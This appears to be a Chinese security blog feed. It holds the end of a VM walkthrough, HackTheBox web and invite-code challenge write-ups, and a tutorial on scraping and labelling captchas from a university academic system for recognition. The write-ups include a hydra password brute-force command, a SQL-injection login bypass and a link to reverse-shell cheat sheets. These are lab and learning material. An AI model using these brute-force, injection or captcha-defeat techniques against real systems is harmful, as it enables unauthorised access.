<li>在文章的开头用到了<code>kali linux</code>下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。记得在一个师傅的面试经验介绍中，他被面试官问到为什么要用arp去探测内网主机，他回答的是相当隐蔽，探测的信息更准确。主要是因为传统探测远程主机是否存活的方法是通过ICMP协议中的回显应答报文来探测(ping)。很多主机为了避免被扫描器探测，通过防火墙将ICMP包屏蔽，从而达到在网络中隐藏的目的。</li>
<li>在文章中用到了两种语言的交互shell。分别是php和python，这里参考老外的博客<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a></li>
<li>对于我个人在提权实战经验方面是十分少的，在这次练习中学到了可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩，由此可见还是自己的实战经验太少了。</li>
<li>最后感概下，英文的重要性。国外很多大牛的博客都是很丰富的，而对于一个英语四级425飘过的菜鸡，我也是很无奈的。只能靠百度翻译了。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[hackthebox web challenges]]></title>
      <url>https://uknowsec.cn/posts/notes/Hackthebox-Web-Challenges.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="hdc">HDC</span></h2><p>根据题目给出来的提示</p>
<p><code>Enter your credentials and press [Submit] to access the company&#39;s Control Panel.</code></p>
<p>并查看源码发现</p>
<p><code>&lt;input type=&quot;button&quot; value=&quot;Submit&quot; onclick=&quot;doProcess()&quot;/&gt;</code></p>
<p>在myscripts.js里发现了<code>doProcess()</code>函数</p>
<p>同时在jquery-3.2.1.js也发现了<code>doProcess()</code>函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;var form=document.createElement(&quot;form&quot;);	form.setAttribute(&quot;method&quot;,&quot;post&quot;);	form.setAttribute(&quot;action&quot;,&quot;main/index.php&quot;);	form.setAttribute(&quot;target&quot;,&quot;view&quot;);	var hiddenField=document.createElement(&quot;input&quot;);	hiddenField.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField.setAttribute(&quot;name&quot;,&quot;name1&quot;);	hiddenField.setAttribute(&quot;value&quot;,&quot;TXlMaXR0bGU&quot;);	var hiddenField2=document.createElement(&quot;input&quot;);	hiddenField2.setAttribute(&quot;type&quot;,&quot;hidden&quot;);	hiddenField2.setAttribute(&quot;name&quot;,&quot;name2&quot;);	hiddenField2.setAttribute(&quot;value&quot;,&quot;cDB3bmll&quot;);	form.appendChild(hiddenField2);		form.appendChild(hiddenField);	form.appendChild(hiddenField2);	document.body.appendChild(form);			window.open(&apos;&apos;,&apos;view&apos;);	form.submit();&#125;</span><br></pre></td></tr></table></figure>
<p>由这里可以得到账号密码<code>TXlMaXR0bGU</code>和<code>cDB3bmll</code>。</p>
<p>进入系统可以看到有一个可以发邮箱的地方。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171357.png" alt=""></p>
<p>发现了一个目录<code>secret_area_</code>访问目录下的mails.txt得到一份邮箱表单。</p>
<p>尝试着用这份邮箱名单去发邮件。</p>
<p>这里用burp遍历</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p>
<p>由此得到flag。</p>
<h2><span id="lernaean">Lernaean</span></h2><p>这里的提示是</p>
<p><code>Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!</code></p>
<p>因为英语比较差，所以搜了下lernaean发现是<code>水蛇许德拉(Lernaean Hydra)</code>的意思。</p>
<p><code>Hydra</code>一个用来破解密码的工具。所以尝试用<code>Hydra</code>来破解密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 88.198.233.174 http-post-form &quot;/:password=^PASS^:Invalid password!&quot; -s 44134</span><br></pre></td></tr></table></figure>
<ul>
<li>-l 指定用户名</li>
<li>-P 指定字典</li>
<li>http-post-form POST请求</li>
<li>:Invalid password!” 密码错误输出的错误信息</li>
<li>-s 指定端口</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505173240.png" alt=""></p>
<p>得到密码登录。页面返回。</p>
<p><code>Ooops! Too slow!</code></p>
<p>利用burp提交即可得到flag.</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505171719.png" alt=""></p>
<h2><span id="cartographer">Cartographer</span></h2><p>进到页面是一个登录框，尝试万能密码</p>
<p><code>&#39; or 1=1#</code></p>
<p>至今进入页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cartographer</span><br><span class="line">Is Still</span><br><span class="line">Under Construction!</span><br></pre></td></tr></table></figure>
<p>发现url中好像是文件包含，尝试info=flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505173920.png" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[hackthebox invite code]]></title>
      <url>https://uknowsec.cn/posts/notes/hackthebox-invite-code.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>一个国外的CTF站点，听群里的师傅说有很多模拟的内网环境，所以想上去试试水。</p>
<p>这个站点是注册是需要邀请码的，这里是一个简单的题目。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505165024.png" alt=""></p>
<p>F12审核元素，可以看到<code>/js/inviteapi.min.js</code>得到一串javascript混淆之后的代码，解密得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &apos;/api/invite/verify&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &apos;/api/invite/how/to/generate&apos;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里定义了两个函数<code>makeInviteCode()</code>和<code>verifyInviteCode(code)</code></p>
<p>利用控制台调用<code>makeInviteCode()</code>得到base64密文</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505165530.png" alt=""></p>
<p>解密得到 <code>In order to generate the invite code, make a POST request to /api/invite/generate</code></p>
<p>用POST请求/api/invite/generate</p>
<p>burp构造一个POST请求</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505170039.png" alt=""></p>
<p>解密得到邀请码。另外在注册的时候发现，不扶墙是不能得到验证码的。但是扶墙之后，会发现得到的验证码跟代理IP的不匹配。</p>
<p>所以在做题的时候直接扶墙做题。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[正方教务系统验证码识别]]></title>
      <url>https://uknowsec.cn/posts/notes/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB.html</url>
      <content type="html"><![CDATA[<h2><span id="验证码预处理">验证码预处理</span></h2><h3><span id="下载验证码">下载验证码</span></h3><h4><span id="实现代码">实现代码：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        get_checkcode(i)</span><br></pre></td></tr></table></figure>
<h4><span id="代码分析">代码分析</span></h4><ul>
<li>利用requests库里的get方法访问生成验证码页面，并保存验证码图片到本地。</li>
</ul>
<h4><span id="代码测试">代码测试：</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ截图20180418133234.png" alt="Alt text"></p>
<h3><span id="灰度化-分割">灰度化、分割</span></h3><h4><span id="实现代码">实现代码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from PIL import Image, ImageTk, ImageFilter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_pic(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(&apos;image\\&apos; + picname)</span><br><span class="line">    im = im.point(lambda i: i &gt; 43, mode=&apos;1&apos;)</span><br><span class="line">    im.save(picname)</span><br><span class="line">    y_min, y_max = 0, 22  # im.height - 1 # 26</span><br><span class="line">    split_lines = [5, 17, 29, 41, 53]</span><br><span class="line">    ims = [im.crop([u, y_min, v, y_max])</span><br><span class="line">           for u, v in zip(split_lines[:-1], split_lines[1:])]</span><br><span class="line">    return ims</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 5):</span><br><span class="line">        get_checkcode(i)</span><br><span class="line">        ims = process_pic(i)</span><br><span class="line">        print(&quot;saving code %d.png cutted&quot; % i)</span><br><span class="line">        for j in range(0, 4):</span><br><span class="line">            ims[j].save(str(i) + &apos;_&apos; + str(j) + &apos;.png&apos;)</span><br></pre></td></tr></table></figure>
<h4><span id="代码分析">代码分析</span></h4><ul>
<li><p>point()方法通过一个函数或者查询表对图像中的像素点进行处理，<code>im = im.point(lambda i: i &gt; 43, mode=&#39;1&#39;)</code><br>中<code>lambda i</code>遍历整张图片，<code>43</code>是一个阀值，大于<code>43</code>填充为<code>1</code>，小于<code>43</code>填充为<code>0</code>，<code>mode=&#39;1&#39;</code>的意思是输出模式为整数型，由此实现灰度化。</p>
</li>
<li><p><code>y_min, y_max = 0, 22</code>设定验证码图片中最大的y值和最小的y值。</p>
</li>
<li><p><code>zip(split_lines[:-1], split_lines[1:])</code> 运行结果为<code>[(5,17),(17,29),(29,41),(41,53)]</code></p>
</li>
<li><p><code>im.crop([u, y_min, v, y_max])</code> ，<code>crop()</code>函数为用来复制一个图片里的一矩形内容，传入参数为矩形的四条边。</p>
</li>
<li><p>所以通过以上的<code>crop()</code>函数实现图片的分割。</p>
</li>
</ul>
<h4><span id="代码测试">代码测试</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ截图20180418142427.png" alt="Alt text"></p>
<h3><span id="标识">标识</span></h3><h4><span id="代码分析">代码分析</span></h4><ul>
<li>利用Python的图形开发界面的库<code>tkinter</code>将验证码图片显示在一个图形化的界面，供人工标识验证码。</li>
<li><code>resize()</code>函数将爬虫爬取的验证码放大，利于辨别。</li>
<li><code>display_pic()</code>函数中<code>tk.PhotoImage()</code>方法插入图片。</li>
</ul>
<h4><span id="实现代码">实现代码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def get_pic_for_display(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    w_box = 300</span><br><span class="line">    h_box = 200</span><br><span class="line">    im_resized = resize(w, h, w_box, h_box, im)</span><br><span class="line">    tk_image = ImageTk.PhotoImage(im_resized)</span><br><span class="line">    return tk_image</span><br><span class="line"></span><br><span class="line">def resize(w, h, w_box, h_box, pil_image):</span><br><span class="line">    f1 = w_box / w</span><br><span class="line">    f2 = h_box / h</span><br><span class="line">    factor = min([f1, f2])</span><br><span class="line">    width = int(w * factor)</span><br><span class="line">    height = int(h * factor)</span><br><span class="line">    return pil_image.resize((width, height), Image.ANTIALIAS)</span><br><span class="line"></span><br><span class="line">def display_pic():</span><br><span class="line">    global im</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    get_checkcode(tmp)</span><br><span class="line">    im = tk.PhotoImage(file= str(tmp)+&apos;.png&apos;)</span><br><span class="line">    im = get_pic_for_display(tmp)</span><br><span class="line">    picLabel[&apos;image&apos;] = im</span><br><span class="line">    cntLabel[&apos;text&apos;] = &apos;总计: &apos; + str(tmp-1) + &apos;/1000&apos;</span><br></pre></td></tr></table></figure>
<h4><span id="代码测试">代码测试</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ截图20180419122240.png" alt="Alt text"></p>
<h3><span id="归类">归类</span></h3><h4><span id="代码分析">代码分析</span></h4><ul>
<li><code>code = var.get()</code>获取图形化界面输入的验证码的值，其类型是一个数组，其中存着四个字符。</li>
<li><code>for i in range(4):</code>遍历四个字符，判断输入的字符值将他们保存到<code>set\</code>目录下相应的字符。其中<code>path = os.path.join(BASE_DIR, &#39;sets&#39;, code[i])</code>是将<code>BASE_DIR, &#39;sets&#39;, code[i]</code>三个参数组合成一个路径返回给<code>path</code>,后续还用了一个<code>if else</code>来判断这个目录是否存在，不存在即用<code>makedirs</code>创建目录。并创建并更新目录其中的<code>conut.txt</code>中的值，这个值是用来记录当前路径下字符验证码图片的数量。<code>ims[i].save(charname)</code>将验证码分隔后得到的图片保存到当前目录下。</li>
</ul>
<h4><span id="实现代码">实现代码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def save_imgs():</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    ims = process_pic(tmp)</span><br><span class="line">    code = var.get()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = os.path.join(BASE_DIR, &apos;sets&apos;, code[i])</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">                char_cnt = eval(f.readline())</span><br><span class="line">        else:</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;w&apos;) as f:</span><br><span class="line">                f.write(&apos;0&apos;)</span><br><span class="line">                char_cnt = 0</span><br><span class="line">        charname = os.path.join(path, str(char_cnt + 1) + &apos;.png&apos;)</span><br><span class="line">        ims[i].save(charname)</span><br><span class="line">        filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">        with open(filepath,&apos;w+&apos;) as f:</span><br><span class="line">            f.write(str(char_cnt + 1))</span><br><span class="line">    update_cnt(tmp)</span><br></pre></td></tr></table></figure>
<h4><span id="代码测试">代码测试</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ截图20180419125209.png" alt="Alt text"></p>
<h3><span id="预处理完整代码">预处理完整代码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">import tkinter as tk</span><br><span class="line">import requests</span><br><span class="line">from PIL import Image, ImageTk, ImageFilter</span><br><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">from matplotlib import pyplot as plt</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_cnt():</span><br><span class="line">    try:</span><br><span class="line">        with open(&apos;count.txt&apos;, &apos;r&apos;) as f:</span><br><span class="line">            cnt = f.readline()</span><br><span class="line">            cnt = eval(cnt)</span><br><span class="line">        return cnt</span><br><span class="line">    except:</span><br><span class="line">        with open(&apos;count.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">            f.write(&apos;0&apos;)</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_cnt(cnt):</span><br><span class="line">    with open(&apos;count.txt&apos;, &apos;w+&apos;) as f:</span><br><span class="line">        f.write(str(cnt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_pic(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    im = im.point(lambda i: i != 43, mode=&apos;1&apos;)</span><br><span class="line">    y_min, y_max = 0, 22  # im.height - 1 # 26</span><br><span class="line">    split_lines = [5, 17, 29, 41, 53]</span><br><span class="line">    ims = [im.crop([u, y_min, v, y_max])</span><br><span class="line">           for u, v in zip(split_lines[:-1], split_lines[1:])]</span><br><span class="line">    return ims</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_pic_for_display(i):</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    im = Image.open(picname)</span><br><span class="line">    w, h = im.size</span><br><span class="line">    w_box = 300</span><br><span class="line">    h_box = 200</span><br><span class="line">    im_resized = resize(w, h, w_box, h_box, im)</span><br><span class="line">    tk_image = ImageTk.PhotoImage(im_resized)</span><br><span class="line">    return tk_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def resize(w, h, w_box, h_box, pil_image):</span><br><span class="line">    f1 = w_box / w</span><br><span class="line">    f2 = h_box / h</span><br><span class="line">    factor = min([f1, f2])</span><br><span class="line">    width = int(w * factor)</span><br><span class="line">    height = int(h * factor)</span><br><span class="line">    return pil_image.resize((width, height), Image.ANTIALIAS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def display_pic():</span><br><span class="line">    global im</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    get_checkcode(tmp)</span><br><span class="line">    im = tk.PhotoImage(file=str(tmp) + &apos;.png&apos;)</span><br><span class="line">    im = get_pic_for_display(tmp)</span><br><span class="line">    picLabel[&apos;image&apos;] = im</span><br><span class="line">    cntLabel[&apos;text&apos;] = &apos;总计: &apos; + str(tmp - 1) + &apos;/1000&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def save_imgs():</span><br><span class="line">    tmp = get_cnt() + 1</span><br><span class="line">    ims = process_pic(tmp)</span><br><span class="line">    code = var.get()</span><br><span class="line">    for i in range(4):</span><br><span class="line">        BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = os.path.join(BASE_DIR, &apos;sets&apos;, code[i])</span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">                char_cnt = eval(f.readline())</span><br><span class="line">        else:</span><br><span class="line">            os.makedirs(path)</span><br><span class="line">            filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">            with open(filepath, &apos;w&apos;) as f:</span><br><span class="line">                f.write(&apos;0&apos;)</span><br><span class="line">                char_cnt = 0</span><br><span class="line">        charname = os.path.join(path, str(char_cnt + 1) + &apos;.png&apos;)</span><br><span class="line">        ims[i].save(charname)</span><br><span class="line">        filepath = os.path.join(path, &apos;count.txt&apos;)</span><br><span class="line">        with open(filepath, &apos;w+&apos;) as f:</span><br><span class="line">            f.write(str(char_cnt + 1))</span><br><span class="line">    update_cnt(tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def submit():</span><br><span class="line">    save_imgs()</span><br><span class="line">    display_pic()</span><br><span class="line">    var.set(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init():</span><br><span class="line">    display_pic()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">global im</span><br><span class="line">app = tk.Tk()</span><br><span class="line">app.title(&apos;Labeller&apos;)</span><br><span class="line">app.geometry(&apos;500x260&apos;)</span><br><span class="line">picLabel = tk.Label(app)</span><br><span class="line">picLabel.pack()</span><br><span class="line">var = tk.StringVar()</span><br><span class="line">textInput = tk.Entry(app, textvariable=var)</span><br><span class="line">textInput.pack(expand=&apos;yes&apos;, fill=&apos;both&apos;, padx=100, side=&apos;top&apos;, pady=10)</span><br><span class="line">submitButton = tk.Button(app, text=&quot;提交&quot;, width=&apos;10&apos;, command=submit)</span><br><span class="line">submitButton.pack()</span><br><span class="line">cntLabel = tk.Label(app)</span><br><span class="line">cntLabel.pack(pady=20)</span><br><span class="line">init()</span><br><span class="line">app.mainloop()</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/labeller.gif" alt="Alt text"></p>
<h2><span id="验证码训练">验证码训练</span></h2><h3><span id="加载-处理图片数据">加载、处理图片数据</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def process(data):</span><br><span class="line">    for i in range(0, len(data)):</span><br><span class="line">        if(data[0][i] &gt; 0):</span><br><span class="line">            data[0][i] = 1</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def load_image(path):</span><br><span class="line">    im = Image.open(path)</span><br><span class="line">    data = np.array(im.getdata()).reshape(1, -1)</span><br><span class="line">    data = process(data)</span><br><span class="line">    return data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>process()</code>函数是实现一个二值化的过程。</li>
<li><code>data = np.array(im.getdata()).reshape(1, -1)</code>中的<code>im.getdata()</code>以包含像素值的<code>sequence</code>对象形式返回图像的内容，以包含像素值的<code>sequence</code>对象形式返回图像的内容，该对象的每一个元素对应一个像素点的<code>R</code>、<code>G</code>和<code>B</code>三个值。</li>
</ul>
